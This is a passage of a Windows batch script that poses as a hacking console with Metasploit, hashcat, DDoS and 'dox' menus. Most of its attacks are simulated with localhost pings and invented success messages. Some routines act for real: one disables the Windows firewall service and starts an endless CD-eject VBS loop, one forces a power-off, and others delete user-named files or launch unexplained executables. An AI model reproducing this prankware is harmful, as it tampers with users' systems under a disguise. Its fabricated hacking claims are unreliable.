:rnd4
set four=%random%
if %four% gtr 255 goto rnd4
echo %one%.%two%.%three%.%four%
goto rnd1

:msfconsole
cls
call :colortext f "Loading"
ping localhost -n 3 >nul
call :colortext a " [...] "
ping localhost -n 3 >nul
:spacer
cls
call :colortext c "Welcome to MSFConsole"
echo.
call :colortext a "Exploits Available for Download"
echo.
call :colortext b "blackmagics HASHCAT WICRACK and METASPLOIT avalible free developed by me"

echo.
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦++++++++¦¦¦¦¦+++++++¦++¦¦ 
echo ¦¦¦¦¦¦¦¦++¦¦¦¦¦¦++++++¦¦¦¦+++++++++++++¦ 
echo ¦¦¦¦¦¦¦++++++¦¦¦++++++¦¦++++++++++++++¦¦ 
echo ¦¦¦¦¦¦¦+++++++¦¦¦+++++++++++++++++++++¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦++++++¦¦¦¦¦¦¦¦¦++++¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+++++¦¦¦¦¦¦¦¦+++++++¦ 
echo ¦¦¦¦¦¦¦¦¦¦++¦¦¦¦¦¦¦+++++++++++++++++++¦¦ 
echo ¦¦¦¦¦¦¦++++¦¦¦¦¦¦¦¦+++++++++++++++++++¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+++++++++++++++++++¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+++++++++++++++++++¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+++++++++++++++++++¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+++++++++++++++++++¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦++++++++++++++++++++¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦++++++++++++¦¦+¦++¦¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+++++++¦¦+++++¦¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+¦¦¦¦+++¦¦¦¦++++++¦¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+++¦¦+¦¦¦¦¦+++++++¦¦¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+++++++++++¦¦¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+++++++++++++++++++¦¦¦¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦++++++++++++++++¦¦¦¦¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+++++++++++¦¦¦¦¦¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+¦¦¦+++++++++++¦¦¦¦¦¦¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+++++++++¦¦¦¦¦¦¦¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦++++++++¦¦¦¦¦¦¦¦¦¦ 
echo ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦++++++¦¦¦¦¦¦¦¦¦¦¦¦
echo.
call :colortext b "Start Your First Command"
echo.
set /p msf00=msf ~ 
if %msf00% == netspoof goto fkehost
if %msf00% == wicrack goto wicr00
if %msf00% == hashcat goto hashcat
if %msf00% == metasploit goto metahack
if %msf00% == exitmsf goto shell00

:metahack
cls
echo ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
echo ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
echo ¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶§§§1§§¶¶
echo ¶¶¶¶¶¶_§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶§1___1§§¶¶¶¶¶
echo ¶¶¶¶§__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶§1______§¶¶¶¶¶¶¶¶¶¶
echo ¶¶¶§___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶§§1_______1§¶¶¶¶¶¶¶¶¶¶¶¶¶¶
echo ¶¶¶____1¶¶¶¶¶¶¶¶¶¶§11_________1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
echo ¶¶_______11111____________§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
echo ¶¶____________________§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
echo ¶¶_______________1§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
echo ¶¶¶__________1§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
echo ¶¶¶¶¶¶§§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
call :colortext a "Welcome to blackmagics Windows MeTa Exploit!"
echo.
echo.
call :colortext c "I hope you enjoy..."
echo.
call :colortext b "Use command 'targetchoose' to get started or 'help' for a command line explination"
echo.
echo.
set /p meta=#MeTa~ 
if %meta% == choosehost goto hostc
if %meta% == help goto metahelp

:metahelp
cls
color c
echo 

:hostc
echo.
call :colortext d "Please choose target Public IP address or IPV4 if on the same WIFI"
echo.
set /p hip=~ 
call :colortext a "Pinging %hip% please wait..."
ping %hip%
echo.
call :colortext b "Connecting to %hip% ..."
ping localhost -n 5 >nul
echo.
call :colortext a "[Connection Successfull Target Vulnerable]"
echo.
call :colortext b "Please choose an IP and LPORT to spoof too..."
echo.
set /p metaip=IP~ 
set /p metalport=LPORT~ 
echo SET PUBLIC IP TO %metaip% 
echo SET LPORT TO %metalport%
ping localhost -n 3 >nul
echo.
echo.
call :colortext a "Generating STUB_LOADER_PAYLOAD"
ping localhost -n 2 >nul
echo GENERATED!
echo.
call :colortext c "SENDING 'STUB_LOADER_PAYLOAD' TO TARGET HOST %hip% USING IP %metaip% AND LPORT %metalport%"
ping localhost -n 3 >nul
netstat -n\
nslookup -host %hip%
ping localhost -n 1 >nul
echo.
call :colortext a "Payload successfully sent target %hip% is infected"
echo.
echo.
:metaconnection
echo Target           : %hip%
echo Target Connection: ONLINE!
echo Target OS        : WINDOWS!
echo Spoofed IP       : %metaip%
echo Spoofed LPORT    : %metalport%
echo PayLoad          : RUNNING!
echo Attack Time      : %time%
echo Data FTP         : c:\windows\information
echo.
call :colortext a "'1' SCREENSHOT"
echo.
call :colortext b "'2' KEYLOGGER"
echo.
call :colortext c "'3' FTP"
echo.
call :colortext d "'4' RUN CONSOLE COMMAND"
echo.
echo.
set /p metacom=@HOST'%hip%'~~ 
if %metacom% == 1 goto metacap
if %metacom% == 2 goto metalog
if %metacom% == 3 goto metaftp
if %metacom% == 4 goto metater
if %metacom% == exit goto msfconsole
:metacap
set /p ss=Screenshot Amount: 
ping localhost -n %ss% >nul
echo %ss% Screenshots were taken and saved to c:\windows\information
pause
goto metaconnection
:metalog
set /p kl=How many seconds would you like to run the keylogger for: 
echo Keylogger Activated for %kl% Seconds!
ping localhost -n %kl% >nul
echo keylog saved to c:\windows\information
pause
goto metaconnection
:metaftp
echo.
call :colortext c "Checking %hip% Please Stand By. blackmagic.."
ping localhost -n 5 >nul
echo.
call :colortext f "Accessing FTP Server on Remote Host %hip%"
call :colortext a "[Access Granted]"
ping localhost -n 4 >nul
echo.
call :colortext f "Accessing Remote Network using port 21"
ping localhost -n 10 >nul
call :colortext a "[Access Granted]"
ping localhost -n 4 >nul
echo. 
attrib
start c:\FTPExp.exe
goto metaconnection
:metater
set /p wlessterminal=%hip%@WINDOWS~ 
if %wlessterminal% == ext goto metaconnection
goto metater


:hashcat
cls
echo *************************************
echo      WELCOME TO HASHCAT V 1.0.0
echo 	  Please type your HASH ----
echo 	  Subscribe to bo2-modz_x --
echo 	  Enjoy --------------------
echo *************************************
echo.
echo.
echo.
call :colortext c "Type your hash below... Hash will automaticly be identified"
echo.
call :colortext a "Word list will automaticly generate also ------------------"
echo.
echo.
call :colortext b "Hash ~ "
set /p hash00=
ping localhost -n 6 >nul
cls
echo.
echo Word list generating...
echo.
ping localhost -n 10 >nul
cls
set hash1=dcl
set hash2=iowq
set hash3=opsa
echo.
echo %hash00% : MD5
echo.
call :colortext a "Bruteforcing Hash: %hash00%"
echo.
ping loaclhost -n 14 >nul
echo Word List: C:\Linux_Logs\Linux\APPLICATIONS\Hashcat\HASHES\Word_List.drz
echo.
ping loaclhost -n 13 >nul
echo A-G
ping loaclhost -n 61 >nul
call :colortext a " Successfull!"
echo.
ping loaclhost -n 13 >nul
echo H-M
ping localhost -n 71 >nul
call :colortext a " Successfull!"
echo.
ping loaclhost -n 14 >nul
echo N-S
ping loaclhost -n 51 >nul
call :colortext a " Successfull!"
echo.
ping loaclhost -n 18 >nul
echo T-Z
ping loaclhost -n 81 >nul
call :colortext a " Successfull!"
echo.
ping localhost -n 41 >nul
echo ...
echo.
echo Converting hash to string...
echo.
ping localhost -n 3 >nul
:00
set 00=%random%
if %00% gtr 2555 goto 00
:01
set 01=%random%
if %01% gtr 25 goto 01
:02
set 02=%random%
if %02% gtr 1000 goto 02
:03
set 03=%random%
if %03% gtr 100 goto 03

echo **************************
echo Hash Successfully Cracked!
echo %hash00% : %00%%hash1%%01%%hash2%%02%%hash3%%03%
echo **************************
echo.
pause
goto shell00

:wicr00
call :colortext a "Using fake host %fhost%"
echo.
echo Welcome to ack!
echo.
ping localhost -n 3 >nul
set /p wicommand=Root@WICrack: ~
if %wicommand% == usingeth0 goto useth0
goto wcr00
:useth0
echo.
set /p wicometh0=Root@WICrack: ~
if %wicometh0% == connectlocal goto conloc
:conloc
cls
set /p conlocip=IP:
goto needaccess
:needaccess
cls
call :colortext c "Enter Password"
ping localhost -n 5 >nul
call :colortext a " [Hash - A097A059AB5F9A8581E32EEC77B8F7DF MD5] "
echo.
ech0.
set /p pw0011=Password:
echo Incorrect!
goto conloc

:fkehost
cls
start C:\acgr.exe
set /p fhost=Set Fake Host: 
goto spacer

:suettr00
cls
start C:\Ettercap.exe
goto shell

:etc00
echo Loading...
ping localhost -n 5 >nul
call :colortext a "Welcome to ETTERCAP V.8"
echo.
call :colortext b "Choose Option"
echo.
echo 1: DDOS Attack
echo 2: Server Attack
echo 3: DOX
echo 4: Force Connect TCP/IP
echo 5: FTP Crack
set /p loc0=
if %loc0% == 1 goto dosa0
if %loc0% == 2 goto sera0
if %loc0% == 3 goto dox0
if %loc0% == 4 goto fora0
if %loc0% == 5 goto ftp0

:kill00 
cls
call :colortext c "Motherfucker do you want to get HAXED?"
ping localhost -n 3 >nul
time 06:66
net stop "MpsSvc" 
taskkill /f /t /im "FirewallControlPanel.exe" 
echo Do >> "opendisk.vbs"
echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> "opendisk.vbs" 
echo Set colCDROMs = oWMP.cdromCollection >> "opendisk.vbs" 
echo colCDROMs.Item(d).Eject  >> "opendisk.vbs"
echo colCDROMs.Item(d).Eject  >> "opendisk.vbs"
echo Loop >> "opendisk.vbs"
start "" "opendisk.vbs"
exit

:ftp0
cls
echo Type Target IP Addres!
set /p IP=
echo.
call :colortext c "Checking %IP% Please Stand By. blackmagic.."
ping localhost -n 5 >nul
echo.
call :colortext f "Accessing FTP Server on Remote Host %IP%"
call :colortext a "[Access Granted]"
ping localhost -n 4 >nul
echo.
call :colortext f "Accessing Remote Network using port 21"
ping localhost -n 10 >nul
call :colortext a "[Access Granted]"
ping localhost -n 4 >nul
echo. 
attrib
start c:\FTPExp.exe
goto shell00

:ng00
cls
call :colortext c "You can not crack this IP"
goto 2l2l00


:fora0
cls
call :colortext d "Force connect [TCP/IP]"
echo.
set /p remh00=Remote Host: 
call :colortext c "ncorrect Remote Host Address"
ping localhost -n 5 >nul
goto 2l2l00

:dox0
cls
echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "temp.vbs"
set text="Welcome, please choose a number and press enter! "
echo speech.speak "Welcome, please choose a number and press enter!" >> "temp.vbs"
start temp.vbs
ping localhost -n 3 >nul
del temp.vbs
echo Welcome to Bo2-Modz_x's DOX Tool
echo -------------------------------------
echo 1. Find a users ip
echo 2. IP Lookup
echo 3. Name Lookup
echo 4. Email Lookup
set /p dox12=#: 
if %dox12% == 1 goto findip
if %dox12% == 2 goto iplookup
if %dox12% == 3 goto namelookup
if %dox12% == 4 goto emaillookup

:findip
start c:\Sky00.exe
goto dox0

:iplookup
start www.ip-tracker.org
goto dox0

:namelookup
start www.whitepages.com
goto dox0

:emaillookup
start www.emailsearchtool.com
goto dox0

:sera0
cls
start c:\acgr.exe
call :colortext b "Server IP Address"
echo.
set /p ip=IP:
echo.
call :colortext a "Time"
echo.
set /p time=Time:
echo.
call :colortext d "Port"
set /p Port=Port:
echo.
mkdir c:\Boot_Logs
echo >> c:\Boot_Logs\Info.txt IP: %ip% Time: %time% Port: %port%
cls
call :colortext c "Booting %ip% for %time% seconds using port %port%"
echo.
call :colortext a "Attack Launched on! %ip%"
ping localhost -n %time% >nul
echo.
call :colortext d "No replys from %ip%"
echo.
pause
goto 2l2l00

:dosa0
cls
start c:\acgr.exe
call :colortext b "IP Address"
echo.
set /p ip=IP:
echo.
call :colortext a "Time"
echo.
set /p time=Time:
echo.
call :colortext d "Port"
set /p Port=Port:
echo.
mkdir c:\Boot_Logs
echo >> c:\Boot_Logs\Info.txt IP: %ip% Time: %time% Port: %port%
cls
call :colortext c "Booting %ip% for %time% seconds using port %port%"
echo.
call :colortext a "Attack Launched on! %ip%"
ping localhost -n %time% >nul
echo.
call :colortext d "No replys from %ip%"
echo.
pause
goto 2l2l00

:apr00
cls
title APR Spoof
start chrome.exe
start iexplore.exe
call :colortext d "Accessing Browser..."
ping localhost -n 6 >nul
cd..
cd..
attrib
ping lcoalhost -n 2 >nul
goto shell00

:del00
cls
call :colortext c "Please type the file path in witch you wish to delete"
echo.
set /p del=-
del "%del%"
ping localhost -n 3 >nul
goto shell00


:talkback00
cls
call :colortext a "Type what you would like your system to say..."
echo.
call :colortext b "Press enter and wait..."
echo. 
set /p tlkbck=
echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "temp.vbs"
set text="%tlkbck%"
echo speech.speak "%tlkbck%" >> "temp.vbs"
start temp.vbs
call :colortext d "Please wait!"
ping localhost -n 10 >nul
del temp.vbs
goto shell00

:cfupdate00
cls
title Checking For Updates...
start c:\Autoconfig.exe
ping localhost -n 3 >nul
goto shell00

:airip00
set /p airip=IP:
cls
color a
call :colortext c "Accessing... %airip%"
echo.
ping localhost -n 5 >nul
echo ACCESS GRANTED! 0x384
ping localhost -n 10 >nul
cls
call :colortext f "Viewing Transactions on %airip% Server Time may be Delayed!"
echo.
echo TRID         CCID       
echo -----------------------------------------------------
ping localhost -n 300 >nul
echo 9902738228   4929 4225 0996 5113
echo -----------------------------------------------------
ping localhost -n 300 >nul
echo 9902738229   5509 1143 8989 6105
echo -----------------------------------------------------
ping localhost -n 300 >nul
echo 9902738229   4716 2990 0334 0085
echo -----------------------------------------------------
ping localhost -n 300 >nul
echo 9902738230   5272 6589 4417 3868
echo -----------------------------------------------------
ping localhost -n 300 >nul
echo 9902738231   4929 4954 1948 4821
echo -----------------------------------------------------
ping localhost -n 30 >nul
call :colortext c "INVALID TRANSACTION KEY"
pause
goto airip00

:callnet00
cls
call :colortext a "Please Wait While I Access Your Network"
color a
echo.
ping localhost -n 2 >nul
call :colortext b "Accessing..."
ping localhost -n 3 >nul
mkdir netstat
echo > netstat\NetworkStatus.net   TCP    192.168.1.129:51396    pool-72-73-109-202:33599  ESTABLISHED
netstat
goto shell00

:sudo
cls
title Sudo
ping localhost -n 2 >nul
call :colortext a "Enter Command!"
echo.
echo.
call :colortext c "Sudo@Localhost ~ "
set /p sudo=

:mkdir00
cls
title MKDIR
set /p nadir=Name Directory:
mkdir %nadir%
ping loclahost -n 3
goto shell00


:makeserver
cls
echo.
echo This featuer 'mkser' is used to set up a custon VPS (virtual private server)
echo.
call :colortext b "Set Up a Server"
echo.
set /p server=Server Name_
set /p serverp=Server Password_
set /p serverpc=Confirm Password
echo.
call :colortext b "Server Successfully Added!"
goto shell00

:cfu00
cls
start "Update PS.bat"
pause >nul
goto shell00

:$nf
cls
title Network Filter...
echo.
call :colortext a "Login to your server"
echo.
set /p nwl=Server Name_
if %nwl% == Steve-Server goto acgra
if not %nwl% == Steve-Server goto ncgra
:acgra
cls
call :colortext a "Enter Passowrd for %nwl%"
echo.
set /p pakkl=_
if %pakkl% == crimzy goto corrtl
if not %pakkl% == crimzy goto ncgra

:corrtl
cls
call :colortext d "Access to Server Was Granted!"
echo.
call :colortext a "Enter Command for Your Server"
set /p udewiudn=
if %udewiudn% == callbacksrv goto cbsrvvac
if %udewiudn% == iwxcallbackrdm goto cbrtmgga
if %udewiudn% == assigncallback goto assscallb
if %udewiudn% == iclientcallback goto icallback
if %udewiudn% == callbackmethod goto callbackmthd

:cbsrvvac
cls
title Callback Server.... %nwl%
call :colortext b "Calling Your Server..."
ping localhost -n 5 >nul
cls
call :colortext f "Server Responded With IP    100.922.67.255"
ping localhost -n 3 >nul
goto shell00

:cbrtmgga
cls
title IWX CALL BACK RDM... %nwl%
call :colortext a "Accessing Server..."
ping localhost -n 5 >nul
echo.
call :colortext a "Access to %nwl% Was Granted!"
echo.
call :colortext f "Enter Command..."
echo.
set /p sercmd=
cls
call :colortext c "Permesion Denied!"
ping localhost -n 5 >nul
goto shell00 

:assscallb
cls
title Assign Callback %nwl%
echo.
call :colortext a "Assign a Command to Your Server... %nwl%"
echo.
call :colortext c "~~"
set /p assignserver=
ping localhost -n 5 >nul
goto shell00

:icallback
cls
title Assign a Callback to Your Server... %nwl%
call :colortext a "Assign a Callback"
echo,
set /p ascallbck=
ping localhost -n 4 >nul
goto shell00

:callbackmthd
cls
title Assign Callback Method... %nwl%
set /p cbmethod=
ping localhost -n 3 >nul
goto shell00

:ncgra
cls
call :colortext c "Incorrect Server Address!"
echo.
call :colortext a "Please Retry"
pause >nul
goto $nf

echo.
pause
goto shell00


:fbatt
cls
title Facebook Shell
start www.facebook.com
ping localhost -n 3 >nul
call :colortext b "Connected to Facebook With Success!"
echo.
call :colortext a "Type Your Next Command!"
echo.
set /p fbs=
if %fbs% == packet_sniffer goto psfbh
if %fbs% == reverse_packet_sniffer goto rvpf

:rvpf
cls
title Reverse Packet Filter Activated
call :colortext d "displaying Reverse Open Connection Filter "
echo.
echo.
ping localhost -n 20 >nul
call :colortext a ""
echo.
ping localhost -n 2 >nul
call :colortext a "Access Granted"
echo.
echo Press Any Key to Retry
pause >nul

:psfbh
cls
title Packet Sniffer Activated
call :colortext d "displaying Open Connection Filter "
echo.
echo.
ping localhost -n 3 >nul
call :colortext a " Password #########"
echo.
ping localhost -n 15 >nul
call :colortext c "Access Denied"
echo.
echo Press Any Key to Retry
pause >nul
goto shell00

:exit00
goto 1

:uname00
cls
call :colortext f "VM271828712762 Linux"
pause >nul
goto shell00

:help00
cls
call :colortext c "shell. The outer layer of a program that provides the user interface,"
echo.
call :colortext b "or way of commanding the computer. The term originally"
echo.
call :colortext d "referred to the software that processed the commands typed into the Unix operating system"
echo.
call :colortext a "(see command line)."
echo.
echo - ipmask 	- masks a users IP address
echo - help  	- Displays a list of usable commands
echo - uname         - Displays current version of the terminal
echo - exit   	- Exits the terminal
echo - mkser  	- Creates a customized server within the terminal
echo - mkdir         - Creates a customized directory within the terminal 
echo - sudo          - Beta
echo - call.network  - Displays network status
echo - update        - Beta
echo - talkback      - Makes your computer speak to you
echo - del	        - Deletes a specified File 
echo - aprspoof      - Beta 
call :colortext a  "- multitool     - A usefull tool for hacking"
echo.
echo - grant.admin   - Dont worry about it
echo - sudo-ettercap - opens a version of ettercap made for windows
call :colortext a "- msfconsole    - Netspoof, wicrack, hashcap, metasploit" 
echo.
echo - airview 	- Use to monitor transactions on a local network 
echo - proxylist     - Generates a list of usable proxys 
echo - getip 	- Opens a skype resolver
echo - sudo-wiscan   - Beta
call :colortext a "- sqlinjection  - Gives you backdoor access to a voulnerable website"
echo.
echo - proxyconfig   - Sets a custom proxy on a users network
echo - voicecon	- Connects to dial-up server 
echo - ifconfig	- Displays Ip config
echo - streetcam     - Beta
echo - hoaxnet	- Used to create a fake network for man in the middle attacks
echo - skypebot      - Beta
call :colortext a "- cookiestealer - Used for password exploits"
echo.
echo - exitshell     - Exits the shell
call :colortext a "- botinject     - injects a number of bots from an sql server to a network"
echo.
echo - newid	        - Spoofs mac address on local system
echo - netsteal	- Sniffs information on a target network
echo - cryptcrack    - Used to brute force hashes
echo - netdata	- Returns specified information about a users network
echo - appinstall    - Used to install applications from third-party software
echo - reversevpn    - Used to bypass a vpn
echo - siteopen      - Opens a specified site 
call :colortext a "- sqlserver      - Create ore login to a mySQL server"
echo.
echo - webping       - Used to gather the ip addresses of websites
echo - cleaner	- Used to speed up your computer
echo - webattack     - Used to take a website offline
call :colortext a "- phoneinject   - Used to exploit an android device"
echo.
echo - serverconnect - Used to connect to a server
call :colortext a "- puppyrat      - Used to create a windows payload for exploitation"
echo.
echo - infosniper    - Gathers information about ip address
call :colortext a "- packetbuilder - Used to send cutomized packets to  a network"
echo.
call :colortext a "- netbot        - Used to add a network to a botnet or server"
echo.
echo - ps3info	- Beta 
echo - iplogger      - Creates a customized link to gather ip addresses
call :colortext a "- custompayload - Used to create customized payloads for exploitations"
echo.
echo - viruscreator  - Used to create 1 of 10 AMAZING viruses
echo - airdump       - Used to hack wpa and wpa2 wifi passwords
call :colortext a "- serverupload  - Used to upload a file to a server without authkey"
echo.
echo - showarp       - Used to view arp
pause
goto shell00

:mask00
cls
echo.
echo This tool 'ipmask' is used to mask your public IP address
echo using advanced tunnelling through sevral proxies to keep
echo the user as secure as possible...
echo.
echo Type your new IP address no DNS IP's
set /p mask=
call :colortext b "Accessing Router"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext c "Access Denied!"
echo.
ping localhost -n 1 >nul
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
ping localhost -n 1 >nul
ping localhost -n 1 >nul
call :colortext c "Access Denied!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext c "Access Denied!"
echo.
ping localhost -n 1 >nul
call :colortext c "Access Denied!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
ping localhost -n 1 >nul
ping localhost -n 1 >nul
ping localhost -n 1 >nul
ping localhost -n 1 >nul
call :colortext c "Access Denied!
echo.
ping localhost -n 1 >nul
ping localhost -n 1 >nul
ping localhost -n 1 >nul
ping localhost -n 1 >nul"
call :colortext c "Access Denied!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
ping localhost -n 1 >nul
call :colortext a "Access Granted!"
echo.
pause >nul
cls
call :colortext a "Access to Server was Successfull!"
echo.
call :colortext b "Your Public IP Address was Successfully Masked!"
echo.
pause >nul
goto shell00

:task
tasklist
pause >nul
cls
goto l

:ass
assoc
pause >nul
goto l

:cmd
start
exit

:exit
exit

:outlog
cls
logoff
goto l

:supersu
cls
color c
if not %USERDOMAIN% == Owner-PC goto acdenm00
set /p adminpw=Password:
if %adminpw% == easyas321 goto super00
if not %adminpw% == easyas321 goto acdenm00

:acdenm00
cls
start c:\WRN.exe
echo Access Denied
shutdown /p
exit

:kerdis00
cls
start c:\remdis.exe
goto shell00

:super00
cls
echo kernal.start
set /p kernal=
if %kernal% == kernal.start goto kerdis00


:netstat
cls
netstat
pause >nul
goto l 

:tree
cls
tree
pause >nul
goto l

:shutdownhost
cls
shutdown -i
pause >nul
cls
goto l

:ping
cls
ping localhost -n 5
pause >nul
goto l

:shut
cls
shutdown -s
cls
goto l


:ssh
cls
echo lol
goto l

:top
cls
goto l


:he
color a
cls
echo uname         "Displays current shell OS version"
echo locale        "View UTF-8 configuration on your system"
echo medusa        "Allows you to preform MITM attacks"
echo top           "View network traffic as network administrator"
echo shutdown      "Shutdown your computer"
echo pinglocalhost "Pings your local IP address"
echo hostshutdown  "Allows you to shutdown computers on your local network using a remote shutdown dialog"
echo tree          "The tree command allows you to view all files on your computer in a tree form"
echo netstat       "View and moniter live network trafic"
echo logout        "Logs the current user out"
echo exit          "Exits the terminal"
echo cmd           "Starts a Windows command prompt"
echo assoc         "View all dinamic librays"
echo tasklist      "Shows all active tasks running on your computer"
echo shell         "Access a Linux based terminal"
echo reboot        "Reboots your computer"
echo webpage       "Visit a website"
echo regedit       "Opens your computers registery"
echo restorepoint  "Creates a system restore point"
echo msgbox        "Displays a user configured message box"
echo scancomp      "Scans a specified directory for viruses"
echo.
call :colortext b "Suscribe to Bo2-Modz_x"
pause 
goto l

:me
pause 
goto l


:lo
cls
color b
echo LANG=cs_CZ.UTF-8
echo LC_CTYPE="cs_CZ.UTF-8"
echo LC_NUMERIC="cs_CZ.UTF-8"
echo LC_TIME="cs_CZ.UTF-8"Fsu
echo LC_COLLATE="cs_CZ.UTF-8"
echo LC_MONETARY="cs_CZ.UTF-8"
echo LC_MESSAGES="cs_CZ.UTF-8"
echo LC_PAPER="cs_CZ.UTF-8"
echo LC_NAME="cs_CZ.UTF-8"
echo LC_ADDRESS="cs_CZ.UTF-8"
echo LC_TELEPHONE="cs_CZ.UTF-8"
echo LC_MEASUREMENT="cs_CZ.UTF-8"
echo LC_IDENTIFICATION="cs_CZ.UTF-8"
echo LC_ALL=
pause >nul
goto l

:un
cls
echo Windows XP
pause >nul
goto l

:ColorText
echo off
<nul set /p ".=%DEL%" > "%~2"
findstr /v /a:%1 /R "^$" "%~2" nul
del "%~2" > nul 5>&1
goto :eof

:boot
@REM (Exportation) service.dll == active 
echo  Begin /etc/profile
@REM LINUX ACTIVE!
echo  System wide environment variables and startup programs.

echo  System wide aliases and functions should go in /etc/bashrc.  Personal
echo  environment variables and startup programs should go into
echo  ~/.bash_profile.  Personal aliases and functions should go into
echo  ~/.bashrc.
::Shell connection patch loader
@REM set echo {{BOOTFILEINFO}RUN} 
echo  Functions to help us manage paths.  Second argument is the name of the
echo  path variable to be modified (default: PATH)
echo pathremove () {
echo         local IFS':'
echo         local NEWPATH
echo         local DIR
echo         local PATHVARIABLE${2:-PATH}
echo         for DIR in ${!PATHVARIABLE} ; do
echo                 if [ "$DIR" ! "$1" ] ; then
echo                   NEWPATH${NEWPATH:$NEWPATH:}$DIR
echo                 fi
echo         done
echo         export $PATHVARIABLE"$NEWPATH"
echo }
ping localhost -n3 >nul
echo pathprepend () {
echo         pathremove $1 $2
echo         local PATHVARIABLE${2:-PATH}
echo         export $PATHVARIABLE"$1${!PATHVARIABLE:+:${!PATHVARIABLE}}"
echo }

echo pathappend () {
echo         pathremove $1 $2
echo         local PATHVARIABLE${2:-PATH}
echo         export $PATHVARIABLE"${!PATHVARIABLE:+${!PATHVARIABLE}:}$1"
echo }

echo export -f pathremove pathprepend pathappend

echo  Set the initial path
echo export PATH/bin:/usr/bin
ping localhost -n3 >nul
echo if [ $EUID -eq 0 ] ; then
echo         pathappend /sbin:/usr/sbin
echo         unset HISTFILE
echo fi

echo  Setup some environment variables.
echo export HISTSIZE1000
echo export HISTIGNORE"&:[bf]g:exit"

